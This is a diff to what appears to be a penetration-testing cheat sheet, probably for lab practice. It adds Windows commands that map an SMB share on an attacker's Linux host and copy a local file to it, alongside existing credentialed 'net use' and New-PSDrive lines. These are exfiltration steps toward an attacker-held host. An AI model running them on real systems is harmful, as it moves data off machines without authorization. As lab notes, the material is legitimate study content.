@@ -213,8 +213,11 @@ service smbd restart
 Windows
 
 ```bash
-CMD-Wind> \\10.10.14.14\path\to\exe
+1) # set the smb shared driver
+CMD-Wind> net use z: \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
+2) #copy from windwos to linux 
+copy C:\path\to\your\file.txt Z:\ 
 
 WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
 WindPS-2> cd new_disk:
